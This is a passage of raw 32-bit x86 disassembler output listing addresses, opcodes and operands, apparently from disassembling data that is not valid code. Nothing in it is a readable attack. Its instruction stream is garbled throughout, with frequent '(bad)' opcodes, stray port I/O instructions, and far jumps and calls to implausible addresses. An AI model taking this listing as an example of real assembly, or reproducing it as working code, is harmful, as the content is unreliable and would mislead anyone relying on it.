  410d67:	shl    DWORD PTR [edi-0x61],1
  410d6a:	scas   al,BYTE PTR es:[edi]
  410d6b:	or     al,BYTE PTR [ebx]
  410d6d:	ret    0x7146
  410d70:	(bad)  
  410d71:	fwait
  410d72:	and    bh,BYTE PTR [eax]
  410d74:	mov    al,0x8e
  410d76:	push   0xa88722c
  410d7b:	mov    esi,0xdde36640
  410d80:	test   al,0xe7
  410d82:	jbe    0x410dc8
  410d84:	popf   
  410d85:	mov    esi,0x11f34937
  410d8a:	pusha  
  410d8b:	retf   
  410d8c:	mov    BYTE PTR [esi+eax*1+0xa],bl
  410d90:	mov    edi,0x62288df5
  410d95:	out    dx,eax
  410d96:	mov    ?,WORD PTR [esi+0x1f3341da]
  410d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d9d:	mov    ds:0x872a0091,eax
  410da2:	cmp    al,0xca
  410da4:	call   0xb1cd:0x80fca542
  410dab:	jne    0x410d8a
  410dad:	cmp    eax,0x53e7e6a
  410db2:	mov    DWORD PTR [eax-0x5ac9df69],ebp
  410db8:	mov    ds:0xfc730549,eax
  410dbd:	or     ebp,edi
  410dbf:	mov    ecx,0xbb088799
  410dc4:	mov    dl,0x17
  410dc6:	adc    al,0xfc
  410dc8:	sbb    al,0x7e
  410dca:	jbe    0x410dbe
  410dcc:	rcr    bh,1
  410dce:	mov    bh,cl
  410dd0:	lds    esi,FWORD PTR [eax+0x40]
  410dd3:	push   eax
  410dd4:	push   cs
  410dd5:	icebp  
  410dd6:	ins    BYTE PTR es:[edi],dx
  410dd7:	lahf   
  410dd8:	sbb    dh,0xa5
  410ddb:	push   ss
  410ddc:	mov    ch,0xe9
  410dde:	test   eax,0x16dd2441
  410de3:	cmp    eax,0x6b89f778
  410de8:	xchg   edi,eax
  410de9:	sub    al,0xb7
  410deb:	push   esp
  410dec:	push   edi
  410ded:	mov    edi,0xa79f5ff9
  410df2:	imul   ecx,DWORD PTR [ebx+0x6be0cdf0],0xffffff96
  410df9:	shl    BYTE PTR [ebx-0x1f],cl
  410dfc:	mov    dh,0x97
  410dfe:	mov    ds:0xa0d08769,eax
  410e03:	xor    DWORD PTR [ebx],esi
  410e05:	iret   
  410e06:	jo     0x410e34
  410e08:	cmp    BYTE PTR [esi+0x285da126],ah
  410e0e:	push   ebx
  410e0f:	inc    ebx
  410e10:	inc    ecx
  410e11:	aam    0x75
  410e13:	clc    
  410e14:	dec    ecx
  410e15:	push   eax
  410e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e17:	shr    cl,0x15
  410e1a:	mov    eax,0xaff76825
  410e1f:	nop
  410e20:	add    BYTE PTR [esi],0x14
  410e23:	es int3 
  410e25:	add    al,0xe7
  410e27:	aas    
  410e28:	fld    QWORD PTR [ebx]
  410e2a:	jno    0x410e4a
  410e2c:	cmp    BYTE PTR [edi+0x4e843317],0xfe
  410e33:	fild   DWORD PTR [eax-0x6c097bc4]
  410e39:	pop    es
  410e3a:	sbb    DWORD PTR [eax+0x30],ecx
  410e3d:	(bad)  
  410e3e:	fsub   QWORD PTR [edx+0x38d6d1d9]
  410e44:	into   
  410e45:	inc    edi
  410e46:	push   0xdc46466f
  410e4b:	sahf   
  410e4c:	outs   dx,DWORD PTR ds:[esi]
  410e4d:	or     eax,0x1aac56db
  410e52:	pop    edi
  410e53:	iret   
  410e54:	mov    ds:0x551a330d,al
  410e59:	dec    eax
  410e5a:	jbe    0x410eab
  410e5c:	mov    dh,0x0
  410e5e:	mov    ah,0xa2
  410e60:	mov    edx,0x23a2ab40
  410e65:	leave  
  410e66:	xchg   ebp,eax
  410e67:	mov    ch,0x7
  410e69:	(bad)  
  410e6a:	pop    ds
  410e6b:	xlat   BYTE PTR ds:[ebx]
  410e6c:	sub    al,0xd8
  410e6e:	scas   al,BYTE PTR es:[edi]
  410e6f:	int3   
  410e70:	jbe    0x410ede
  410e72:	jae    0x410ef2
  410e74:	mov    ah,0xd9
  410e76:	sub    edx,esp
  410e78:	jmp    0x410e14
  410e7a:	jmp    0xec9c69ba
  410e7f:	test   BYTE PTR [ecx+0x3b26e8af],0x96
  410e86:	es (bad) 
  410e88:	jl     0x410ee1
  410e8a:	(bad)  
  410e8b:	bts    DWORD PTR [edx],0xc3
  410e8f:	and    al,0xa6
  410e91:	push   edx
  410e92:	push   es
  410e93:	rcl    DWORD PTR [ecx],0x75
  410e96:	dec    esp
  410e97:	nop
  410e98:	cwde   
  410e99:	test   eax,0x5972c26
  410e9e:	xor    DWORD PTR [esi],0x21ffde68
  410ea4:	rol    DWORD PTR [edi-0x642e443f],cl
  410eaa:	(bad)  
  410eac:	cmp    al,0xaf
  410eae:	repz mov ds:0x9fb943ce,eax
  410eb4:	pop    ebp
  410eb5:	scas   eax,DWORD PTR es:[edi]
  410eb6:	outs   dx,BYTE PTR ds:[esi]
  410eb7:	iret   
  410eb8:	(bad)  
  410eb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eba:	jmp    0x8985:0x78ebc709
  410ec1:	sbb    edx,DWORD PTR [eax-0x61]
  410ec4:	mov    cl,0x49
  410ec6:	ret    
  410ec7:	inc    esi
  410ec8:	in     al,dx
  410ec9:	xchg   esi,eax
  410eca:	add    BYTE PTR [esi+0x4dabd501],al
  410ed0:	push   ecx
  410ed1:	sub    eax,0xb08238c2
  410ed6:	sub    bh,BYTE PTR [edx-0x48d76bd1]
  410edc:	mov    ecx,0xf29f11c1
  410ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ee2:	sbb    eax,DWORD PTR [ebp-0x151124eb]
  410ee8:	je     0x410f0c
  410eea:	pop    es
  410eeb:	repz aad 0x24
  410eee:	inc    ebp
  410eef:	cld    
  410ef0:	xchg   DWORD PTR [eax],esi
  410ef2:	fisttp DWORD PTR [eax-0x6e]
  410ef5:	cld    
  410ef6:	adc    eax,0xf56e7d13
  410efb:	inc    ebp
  410efc:	mov    dh,0xc4
  410efe:	inc    edx
  410eff:	cmp    DWORD PTR [ebp+0x7e7f5eba],eax
  410f05:	ins    BYTE PTR es:[edi],dx
  410f06:	(bad)  
  410f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f08:	mov    ds:0x92637974,eax
  410f0d:	pop    ds
  410f0e:	jb     0x410f7e
  410f10:	jno    0x410ef6
  410f12:	add    ebx,ebp
  410f14:	retf   0x85cc
  410f17:	(bad)
  410f1a:	mov    bh,0x63
  410f1c:	sbb    al,0xbd
  410f1e:	and    bh,BYTE PTR [ebp+edx*2-0x5b36404b]
  410f25:	shr    edx,1
  410f27:	fistp  QWORD PTR [ebp-0x7b49723]
  410f2d:	mov    al,bh
  410f2f:	imul   esi,esp,0xb37a1ead
  410f35:	jl     0x410f95
  410f37:	push   esp
  410f38:	loop   0x410f9e
  410f3a:	adc    BYTE PTR ds:0x3397248c,bl
  410f40:	pop    edi
  410f41:	loopne 0x410f84
  410f43:	sub    BYTE PTR [ebx+0x7a],ch
  410f46:	out    dx,eax
  410f47:	stos   DWORD PTR es:[edi],eax
  410f48:	xchg   edi,eax
  410f49:	int3   
  410f4a:	adc    BYTE PTR [esi],ch
  410f4c:	sbb    DWORD PTR [edi-0x636667ab],ecx
  410f52:	(bad)  
  410f54:	mov    edx,0xd32e137d
  410f59:	or     al,0x3e
  410f5b:	stc    
  410f5c:	dec    ecx
  410f5d:	in     al,dx
  410f5e:	and    eax,0xa91b9af9
  410f63:	popf   
  410f64:	pop    esp
  410f65:	push   ebx
  410f66:	call   0xacb7ffbb
  410f6b:	out    0x42,al
  410f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f6e:	pmaxsw mm5,QWORD PTR [eax+eax*4+0x0]
  410f73:	test   DWORD PTR [eax],0x45d2f32a
  410f79:	sub    eax,0x50a0b97b
  410f7e:	mov    ah,0xd6
  410f80:	adc    eax,0xbac358b6
  410f85:	ror    BYTE PTR [eax+0x23],1
  410f88:	stos   BYTE PTR es:[edi],al
  410f89:	add    eax,0x182e1a70
  410f8e:	sbb    ebp,DWORD PTR [ebx-0x53221627]
  410f94:	test   BYTE PTR [ebx-0x60d11f08],bl
  410f9a:	dec    ecx
  410f9c:	gs pop ss
  410f9e:	je     0x410f36
  410fa0:	and    BYTE PTR [edx+0x10247123],0x8b
  410fa7:	fadd   st,st(5)
  410fa9:	mov    al,ds:0x39370347
  410fae:	mov    ds:0x5a142c1b,eax
  410fb3:	or     BYTE PTR [edx],dl
  410fb5:	and    al,0xf8
  410fb7:	sbb    al,0x76
  410fb9:	xlat   BYTE PTR ds:[ebx]
  410fba:	int3   
  410fbb:	ja     0x41101c
  410fbd:	pop    eax
  410fbe:	imul   ecx,DWORD PTR [edx+0x2f],0xffffffce
  410fc2:	icebp  
  410fc3:	in     al,0x12
  410fc5:	pop    ds
  410fc6:	enter  0x7b3a,0x20
  410fca:	arpl   WORD PTR [ebx],si
  410fcc:	push   0xea39bc52
  410fd1:	sub    DWORD PTR [edi],ecx
  410fd3:	jo     0x410fb1
  410fd5:	fdivr  DWORD PTR [edx-0x6]
  410fd8:	repz push 0xffffffe7
  410fdb:	mov    edi,0x25ae3509
  410fe0:	jae    0x410f83
  410fe2:	cmc    
  410fe3:	sub    eax,0x71ed7eee
  410fe8:	in     al,0xa7
  410fea:	or     bh,ah
  410fec:	fmul   DWORD PTR [esi-0xb]
  410fef:	mov    ebx,0xd30807f2
  410ff4:	cli    
  410ff5:	add    al,ah
  410ff7:	or     DWORD PTR cs:[esi+0x55af596b],eax
  410ffe:	int    0xba
  411000:	mov    ds:0x5a0da26d,eax
  411005:	or     DWORD PTR [ebp-0x19],0xffffff9d
  411009:	cmp    al,BYTE PTR [ebp+0x2a0a4193]
  41100f:	not    BYTE PTR [eax]
  411011:	dec    ebx
  411012:	test   BYTE PTR [ecx+ebx*4-0x3556dce9],ch
  411019:	sbb    esi,DWORD PTR [esi+eiz*1]
  41101c:	std    
  41101d:	jnp    0x411020
  41101f:	pusha  
  411020:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411022:	shl    edx,cl
  411024:	fsubr  st,st(0)
  411026:	push   esp
  411027:	rol    DWORD PTR [ecx+ecx*4+0x15e0c200],0x46
  41102f:	outs   dx,BYTE PTR ds:[esi]
  411030:	pop    esi
  411031:	ds or  edi,esi
  411034:	enter  0x20dc,0x9e
  411038:	fs pop ebx
  41103a:	test   BYTE PTR [ebp-0x15c68dc9],bl
  411040:	pop    ecx
  411041:	mov    ebp,0xa9a2ad89
  411046:	scas   al,BYTE PTR es:[edi]
  411047:	add    al,0x9
  411049:	pop    esi
  41104a:	xchg   ebx,eax
  41104b:	xchg   ecx,eax
  41104c:	mov    ch,0xa4
  41104e:	cmp    eax,0x841e239e
  411053:	shr    BYTE PTR [ebx],0xb0
  411056:	mov    al,ds:0x29f5038a
  41105b:	push   ebp
  41105c:	dec    edi
  41105d:	mov    bl,0x40
  41105f:	pusha  
  411060:	rcl    edi,0x4a
  411063:	push   0xffffffb8
  411065:	out    0x3a,al
  411067:	call   0x85733796
  41106c:	icebp  
  41106d:	push   ds
  41106e:	scas   al,BYTE PTR es:[edi]
  41106f:	adc    ecx,0x652a0ef9
  411075:	sub    BYTE PTR [bx+si],dh
  411078:	repz pop ss
  41107a:	adc    dh,BYTE PTR [edx+ebp*8]
  41107d:	xor    eax,DWORD PTR [ebp+ebx*4-0x4c7aab1c]
  411084:	push   edx
  411085:	popa   
  411086:	xchg   edi,eax
  411087:	outs   dx,DWORD PTR ds:[esi]
  411088:	add    al,BYTE PTR [eax+0x5f85b5e]
  41108e:	loop   0x41102d
  411090:	sbb    eax,0xa32a9af8
  411095:	sub    eax,DWORD PTR [edi+0x62e9be3b]
  41109b:	jl     0x411112
  41109d:	mov    BYTE PTR [ebp+0x4f],cl
  4110a0:	and    eax,0x70de94d
  4110a5:	fnstcw WORD PTR [ecx]
  4110a7:	mov    ss,WORD PTR [ebx+ebx*4]
  4110aa:	lock cmc 
  4110ac:	push   edi
  4110ad:	mov    bl,0x4b
  4110af:	add    BYTE PTR [ebx],0xa
  4110b2:	shl    bl,1
  4110b4:	mov    ah,0x4d
  4110b6:	lds    esi,FWORD PTR [esi-0x6c456710]
  4110bc:	in     eax,0xe1
  4110be:	pop    ds
  4110bf:	cmp    ebx,DWORD PTR [edi]
  4110c1:	aad    0x7d
  4110c3:	mov    bl,0x13
  4110c5:	gs ret 
  4110c7:	or     al,0x28
  4110c9:	dec    edx
  4110ca:	jmp    0x3b05:0xa00067f9
  4110d1:	shl    DWORD PTR [ecx+ebp*4+0x134a75fa],0x37
  4110d9:	out    0x50,eax
  4110db:	aas    
  4110dc:	sahf   
  4110dd:	mov    ds:0xfe87cf14,al
  4110e2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e4:	aas    
  4110e5:	sbb    DWORD PTR ds:0xafe46c7,eax
  4110eb:	add    al,ch
  4110ed:	fimul  WORD PTR [ecx+0x61]
  4110f0:	lods   al,BYTE PTR ds:[esi]
  4110f1:	sbb    ebx,ebx
  4110f3:	setl   BYTE PTR [esi+0x5a51fd85]
  4110fa:	out    0xd9,eax
  4110fc:	push   ecx
  4110fd:	xchg   esp,eax
  4110fe:	inc    ebp
  4110ff:	nop
  411100:	rcr    BYTE PTR [esi-0x36],1
  411103:	imul   ebx,DWORD PTR [esi],0xfffffffc
  411106:	pop    edx
  411107:	sub    cl,cl
  411109:	nop
  41110a:	test   BYTE PTR [ebp-0x14],dl
  41110d:	fld    QWORD PTR [ecx]
  41110f:	mov    ah,0xd4
  411111:	jae    0x411167
  411113:	cld    
  411114:	or     eax,0xf02eb8c0
  411119:	imul   esi,DWORD PTR [edi-0x39d58d94],0xffffffad
  411120:	or     edx,ebx
  411122:	getsec 
  411124:	pop    ecx
  411125:	pop    es
  411126:	ins    DWORD PTR es:[edi],dx
  411127:	dec    edi
  411128:	std    
  411129:	mov    ebx,0x3a00fee4
  41112e:	ss or  al,0xa1
  411131:	fistp  WORD PTR [eax]
  411133:	stos   DWORD PTR es:[edi],eax
  411134:	adc    ebx,DWORD PTR [ebx-0x2d963d54]
  41113a:	push   0x2385714f
  41113f:	addr16 push esi
  411141:	adc    BYTE PTR [eax*4-0x1f5bdbdf],dl
  411148:	lahf   
  411149:	fwait
  41114a:	std    
  41114b:	frstor [ebx-0x65]
  41114e:	mov    ds:0xd6b453b7,eax
  411153:	sbb    bl,BYTE PTR [eax+ebx*1+0x7f7dcad5]
  41115a:	(bad)  
  41115b:	rol    BYTE PTR [edx+0x39],1
  41115e:	test   DWORD PTR [edx+esi*4],esp
  411161:	in     al,0xae
  411163:	jg     0x4111ad
  411165:	lods   eax,DWORD PTR ds:[esi]
  411166:	sub    al,0xe8
  411168:	lods   eax,DWORD PTR ds:[esi]
  411169:	fwait
  41116a:	mov    es,WORD PTR [ecx]
  41116c:	jnp    0x411155
  41116e:	test   DWORD PTR [eax],0x6ddf32c9
  411174:	inc    eax
  411175:	add    al,0xf5
  411177:	mov    esp,0xafffc2f0
  41117c:	xchg   ch,ah
  41117e:	dec    ecx
  41117f:	jge    0x411193
  411181:	sbb    eax,0xb7db6a5c
  411186:	dec    edi
  411187:	cmp    al,0x4f
  411189:	sub    ebp,DWORD PTR [edx+0x2a04cd59]
  41118f:	adc    DWORD PTR [esi],0xe4d4e323
  411195:	pop    ecx
  411196:	or     al,bl
  411198:	xor    ch,BYTE PTR [edi-0x4c]
  41119b:	add    BYTE PTR [ecx+0x4bb6a04e],cl
  4111a1:	stos   DWORD PTR es:[edi],eax
  4111a2:	mov    bh,0x59
  4111a4:	xchg   edx,eax
  4111a5:	add    dl,dl
  4111a7:	mov    ds:0xd4a6065d,al
  4111ac:	nop
  4111ad:	out    dx,al
  4111ae:	jnp    0x41118a
  4111b0:	xchg   ebp,eax
  4111b1:	inc    esi
  4111b2:	xchg   ebp,eax
  4111b3:	loopne 0x41116f
  4111b5:	cmpxchg DWORD PTR [eax],ebx
  4111b8:	mov    bh,0xaa
  4111ba:	mov    esi,ebx
  4111bc:	imul   edx,DWORD PTR [edx+0x58],0xa0e3e3
  4111c3:	mov    ebp,0x9502be1
  4111c8:	xor    BYTE PTR [eax+0x28a16562],dh
  4111ce:	dec    edi
  4111cf:	jns    0x4111a0
  4111d1:	repnz and al,BYTE PTR [edx-0x30b085a1]
  4111d8:	jnp    0x411215
  4111da:	jb     0x411237
  4111dc:	inc    eax
  4111dd:	cmp    al,0x7f
  4111df:	outs   dx,BYTE PTR ds:[esi]
  4111e0:	ret    0x9107
  4111e3:	xchg   esp,eax
  4111e4:	mov    ds:0x9f853975,al
  4111e9:	clc    
  4111ea:	cwde   
  4111eb:	(bad)  
  4111ec:	fisubr WORD PTR [ecx]
  4111ee:	xor    ebp,DWORD PTR [edi]
  4111f0:	int    0x5b
  4111f2:	aaa    
  4111f3:	int3   
  4111f4:	push   edx
  4111f5:	bound  esp,QWORD PTR [ebp-0x4d]
  4111f8:	jmp    0x377f7360
  4111fd:	int    0xb8
  4111ff:	fcom   st(5)
  411201:	adc    BYTE PTR [edx],ah
  411203:	test   eax,0x85bf6a9a
  411208:	int3   
  411209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41120a:	xchg   esp,eax
  41120b:	mov    eax,0x471e1457
  411210:	ds ror edi,cl
  411213:	outs   dx,DWORD PTR ds:[esi]
  411214:	test   al,0xd4
  411216:	gs mov dl,0x64
  411219:	test   DWORD PTR cs:[ecx+edi*4+0x50],ecx
  41121e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41121f:	ja     0x4111ed
  411221:	pop    ebp
  411222:	dec    esi
  411223:	lock push eax
  411225:	scas   al,BYTE PTR es:[edi]
  411226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411227:	test   bh,ah
  411229:	lock mov al,ds:0x1092d822
  41122f:	jmp    0x41128c
  411231:	ficomp WORD PTR [eax-0x3a]
  411234:	shl    bh,cl
  411236:	es jecxz 0x41123a
  411239:	inc    edx
  41123a:	mov    eax,0xa92ef49b
  41123f:	mov    ss,WORD PTR [esi+0xa15436b]
  411245:	sub    ebx,esi
  411247:	mov    al,0x82
  411249:	popf   
  41124a:	sti    
  41124b:	lock xor eax,0x7e75658d
  411251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411252:	and    BYTE PTR [ecx-0x40],ah
  411255:	popf   
  411256:	fistp  WORD PTR [ecx]
  411258:	loope  0x4111df
  41125a:	pusha  
  41125b:	retf   0xcbe5
  41125e:	(bad)  
  41125f:	jo     0x4111f6
  411261:	and    eax,0x6d926175
  411266:	imul   edi,DWORD PTR [edi-0x6fca882e],0x63
  41126d:	hlt    
  41126e:	and    ebx,esp
  411270:	iret   
  411271:	pop    es
  411272:	sti    
  411273:	adc    ch,BYTE PTR [edx-0x25f52eb5]
  411279:	cmp    DWORD PTR ds:0xef17e53b,ebx
  41127f:	popa   
  411280:	test   BYTE PTR [eax+eax*1+0x33],cl
  411284:	ds push edx
  411286:	xchg   edx,eax
  411287:	adc    ah,BYTE PTR [ecx+0x629c39d8]
  41128d:	mov    ah,0xe7
  41128f:	inc    ebp
  411290:	jge    0x411219
  411292:	sbb    dh,al
  411294:	mov    edx,0xd9fb9749
  411299:	loope  0x411220
  41129b:	push   ds
  41129c:	icebp  
  41129d:	stos   BYTE PTR es:[edi],al
  41129e:	mov    eax,ds:0xb37ef9bd
  4112a3:	(bad)  
  4112a5:	or     ebp,DWORD PTR [edx+0x71]
  4112a8:	(bad)  
  4112a9:	int3   
  4112aa:	imul   esi,DWORD PTR es:[edx-0x377166c2],0x3c
  4112b2:	pop    edi
  4112b3:	je     0x41125a
  4112b5:	inc    ebx
  4112b6:	jb     0x411262
  4112b8:	mov    ds:0x8f6c8e12,al
  4112bd:	push   cs
  4112be:	enter  0xadc8,0xab
  4112c2:	aam    0x6
  4112c4:	outs   dx,DWORD PTR ds:[esi]
  4112c5:	mov    esp,0x8d5a56ba
  4112ca:	mov    ds:0x2ecf7a92,eax
  4112cf:	sbb    eax,0x867eef34
  4112d4:	fcmovnu st,st(4)
  4112d6:	mov    edx,0x1c70a149
  4112db:	js     0x411307
  4112dd:	std    
  4112de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112df:	mov    esi,0x29d3cb29
  4112e4:	dec    ebx
  4112e5:	js     0x4112d3
  4112e7:	xor    eax,0x379986fa
  4112ec:	pushf  
  4112ed:	addr16 pop es
  4112ef:	js     0x41128a
  4112f1:	cmp    dl,BYTE PTR [ebx]
  4112f3:	rcr    cl,0x8c
  4112f6:	mov    ds:0xaf5dbca5,al
  4112fb:	dec    ecx
  4112fc:	mov    dh,0x6e
  4112fe:	push   ecx
  4112ff:	push   esi
  411300:	inc    eax
  411301:	xchg   edx,eax
  411302:	cli    
  411303:	stc    
  411304:	ss inc ecx
  411306:	shr    DWORD PTR [ecx+0x5de634d7],cl
  41130c:	arpl   WORD PTR [esi+ebp*8],bx
  41130f:	add    eax,0x3b7fa95a
  411314:	pusha  
  411315:	in     al,dx
  411316:	sub    al,BYTE PTR [ecx+0x681e03cc]
  41131c:	nop
  41131d:	in     eax,dx
  41131e:	sahf   
  41131f:	fld    DWORD PTR [ebp+0x4808b9d9]
  411325:	(bad)  
  411326:	or     ecx,DWORD PTR [esi+eiz*1]
  411329:	sbb    esi,DWORD PTR [ebx-0x53]
  41132c:	loop   0x41135d
  41132e:	fstp   QWORD PTR [ebp-0x245383fe]
  411334:	imul   ecx,DWORD PTR [edi-0x31a3587e],0x5f883cbb
  41133e:	sti    
  41133f:	(bad)  
  411340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411341:	js     0x41136b
  411343:	shl    bl,cl
  411345:	add    eax,DWORD PTR [esp+edx*8]
  411348:	popa   
  411349:	fnstenv [ecx]
  41134b:	aas    
  41134c:	mov    edi,0x42aa0991
  411351:	inc    ecx
  411352:	and    BYTE PTR [ebx+eax*1+0x1b],0xc4
  411357:	jnp    0x411344
  411359:	leave  
  41135a:	in     al,dx
  41135b:	shl    BYTE PTR [ebx-0x131c3ad2],cl
  411361:	sub    eax,0xa1580179
  411366:	xor    eax,0xedf5597f
  41136b:	xor    ebx,DWORD PTR [eax+ecx*8-0x16]
  41136f:	lods   al,BYTE PTR ds:[esi]
  411370:	sbb    cl,al
  411372:	inc    esp
  411373:	ror    DWORD PTR ds:0xb5ea5f54,cl
  411379:	and    al,0xef
  41137b:	sub    BYTE PTR [eax],ah
  41137d:	push   0x4da35f88
  411382:	add    al,0x2f
  411384:	push   0x0
  411386:	mov    cl,0xb
  411388:	mov    ah,0xfa
  41138a:	jmp    0x73558c47
  41138f:	stos   DWORD PTR es:[edi],eax
  411390:	(bad)  
  411391:	pusha  
  411392:	call   0xa3d7772
  411397:	ret    
  411398:	push   edx
  411399:	ret    
  41139a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41139b:	inc    eax
  41139c:	int    0xe0
  41139e:	(bad)  
  41139f:	sub    BYTE PTR [ebx+0x62],dh
  4113a2:	je     0x411360
  4113a4:	sar    edx,cl
  4113a6:	fdivrp st(0),st
  4113a8:	fwait
  4113a9:	jmp    0x4113a0
  4113ab:	cdq    
  4113ac:	add    edx,edx
  4113ae:	fiadd  DWORD PTR [eax-0x62]
  4113b1:	jp     0x41133c
  4113b3:	xchg   edx,eax
  4113b4:	mov    ecx,0xb236d395
  4113b9:	pop    ebx
  4113ba:	imul   edi,DWORD PTR [edx-0x35e9e933],0x11a51c54
  4113c4:	sbb    al,0xcf
  4113c6:	das    
  4113c7:	call   0x5f85:0xc80316a0
  4113ce:	outs   dx,DWORD PTR ds:[esi]
  4113cf:	out    0x6d,al
  4113d1:	das    
  4113d2:	fnstsw WORD PTR [ecx]
  4113d4:	pop    ds
  4113d5:	xor    bh,0x31
  4113d8:	jnp    0x4113ed
  4113da:	bound  edi,QWORD PTR [edx+0x1144d73b]
  4113e0:	cld    
  4113e1:	and    DWORD PTR ds:0x44dcb46e,ebx
  4113e7:	xor    eax,0xa816fbca
  4113ec:	cmp    BYTE PTR ds:0xca5adc13,bh
  4113f2:	lock dec edi
  4113f4:	test   eax,0x24e09d72
  4113f9:	add    BYTE PTR [esi+0x3f53a00e],bl
  4113ff:	leave  
  411400:	jmp    0x411403
  411402:	in     al,0x14
  411404:	call   0x7da48cb8
  411409:	add    DWORD PTR [ebx+0x10d0e594],edx
  41140f:	data16 jg 0x4113b8
  411412:	xchg   al,al
  411414:	cmp    cl,BYTE PTR [eax]
  411416:	shr    DWORD PTR [esi-0xb4ac0b5],cl
  41141c:	add    DWORD PTR ds:0xf31d61d8,0x8816ad63
  411426:	aas    
  411427:	add    dh,bl
  411429:	dec    edx
  41142a:	xor    BYTE PTR [edi+0x66],al
  41142d:	push   ss
  41142e:	nop
  41142f:	leave  
  411430:	xor    ecx,ecx
  411432:	or     DWORD PTR [eax],ecx
  411434:	lods   al,BYTE PTR ds:[esi]
  411435:	call   0x8e06:0x19d84a3a
  41143c:	ins    BYTE PTR es:[edi],dx
  41143d:	jno    0x4113f0
  41143f:	xor    ah,BYTE PTR [esi]
  411441:	pusha  
  411442:	pop    ds
  411443:	sbb    eax,DWORD PTR [ecx]
  411445:	mov    edx,0xc990158e
  41144a:	inc    ebx
  41144b:	mov    ebp,DWORD PTR [ecx-0x28]
  41144e:	ficom  DWORD PTR [esp+ebp*2+0x3fdd73b6]
  411455:	xchg   ecx,eax
  411456:	pop    ebx
  411457:	in     al,dx
  411458:	jmp    0xf4fdb172
  41145d:	xchg   ebp,eax
  41145e:	mov    ecx,0x72f11d97
  411463:	lock retf 0xbd48
  411467:	test   BYTE PTR [esi+0x4c],cl
  41146a:	test   eax,0xfa350562
  41146f:	mov    ebx,esi
  411471:	dec    esp
  411472:	scas   eax,DWORD PTR es:[edi]
  411473:	and    dh,0xe4
  411476:	mov    DWORD PTR [ecx],eax
  411478:	cs jno 0x411400
  41147b:	inc    ecx
  41147c:	sbb    BYTE PTR [ebp+0x2b],0x9d
  411480:	sub    ebp,ebp
  411482:	push   ebx
  411483:	jb     0x41146b
  411485:	clc    
  411486:	xlat   BYTE PTR ds:[ebx]
  411487:	leave  
  411488:	ins    BYTE PTR es:[edi],dx
  411489:	pop    edx
  41148a:	cli    
  41148b:	pusha  
  41148c:	aam    0x30
  41148e:	jg     0x411421
  411490:	div    bl
  411492:	iret   
  411493:	sbb    al,0x55
  411495:	cmp    DWORD PTR [edx+0x6e],ebx
  411498:	arpl   WORD PTR [ecx+0x3a],bx
  41149b:	popa   
  41149c:	int3   
  41149d:	fwait
  41149e:	shr    BYTE PTR [esi],1
  4114a0:	inc    ebp
  4114a1:	mov    edx,0x8e8e9edd
  4114a6:	jmp    DWORD PTR [edi]
  4114a8:	leave  
  4114a9:	add    cl,BYTE PTR [edi-0x7d]
  4114ac:	cli    
  4114ad:	fmul   st(7),st
  4114af:	mov    BYTE PTR [esi],ah
  4114b1:	ds out 0x3,eax
  4114b4:	adc    bl,bh
  4114b6:	fstp   QWORD PTR [edx+eiz*2-0x2f2f104b]
  4114bd:	jae    0x4114f7
  4114bf:	adc    eax,0x605dbdb0
  4114c4:	pop    edi
  4114c5:	les    ebx,FWORD PTR [ebp+0x3117cfea]
  4114cb:	xchg   ebx,eax
  4114cc:	sbb    bh,BYTE PTR [ebx+0x4d22c41]
  4114d2:	jno    0x4114f0
  4114d4:	imul   edi,esi,0x9f140e65
  4114da:	add    al,0x44
  4114dc:	mov    WORD PTR [ecx+0x3d424795],ds
  4114e2:	xor    ecx,esi
  4114e4:	(bad)  
  4114e5:	xor    eax,eax
  4114e7:	pop    ebx
  4114e8:	es repz push cs
  4114eb:	test   DWORD PTR [edi-0x2],ebp
  4114ee:	ins    BYTE PTR es:[edi],dx
  4114ef:	(bad)  
  4114f0:	int    0xc6
  4114f2:	cmp    al,0xba
  4114f4:	iret   
  4114f5:	test   DWORD PTR [edx+eax*8],0xe2fbcf0a
  4114fc:	arpl   WORD PTR [edi],si
  4114fe:	addr16 jb 0x411545
  411501:	jb     0x411551
  411503:	jg     0x411565
  411505:	es in  eax,dx
  411507:	add    al,0x1
  411509:	jecxz  0x41151c
  41150b:	mov    ebx,0xe94f0172
  411510:	icebp  
  411511:	add    esp,ebp
  411513:	arpl   WORD PTR [esi+0x26],ax
  411516:	repz push 0x48
  411519:	push   cs
  41151a:	pop    ds
  41151b:	or     dh,bh
  41151d:	inc    edi
  41151e:	imul   edi,DWORD PTR [edi],0xfffffff9
  411521:	gs scas eax,DWORD PTR es:[edi]
  411523:	sub    ecx,esp
  411525:	xor    esi,DWORD PTR [eax+0x46]
  411528:	fadd   st(6),st
  41152a:	dec    eax
  41152b:	pop    ebp
  41152c:	aad    0x74
  41152e:	scas   eax,DWORD PTR es:[edi]
  41152f:	mov    eax,0x3ef92bd
  411534:	es xchg edx,eax
  411536:	cmp    al,0x13
  411538:	cmp    bl,BYTE PTR [ebx+ebx*8+0xc17520b]
  41153f:	mov    ebx,0xd00b8364
  411544:	inc    eax
  411545:	mov    edi,0xf4f57c39
  41154a:	push   edx
  41154b:	stc    
  41154c:	pop    ss
  41154d:	(bad)  
  41154e:	test   eax,0xc68e8e32
  411553:	push   edx
  411554:	fisttp QWORD PTR [edi]
  411556:	shl    DWORD PTR [edx+0x21dffab9],0x41
  41155d:	xlat   BYTE PTR ds:[ebx]
  41155e:	mov    ds:0xeb88684c,al
  411563:	scas   al,BYTE PTR es:[edi]
  411564:	sbb    cl,BYTE PTR [esi-0x5]
  411567:	(bad)  
  411568:	sub    BYTE PTR [ebx+0x11d82aa],cl
  41156e:	inc    edi
  41156f:	mov    eax,ds:0x2327a1c5
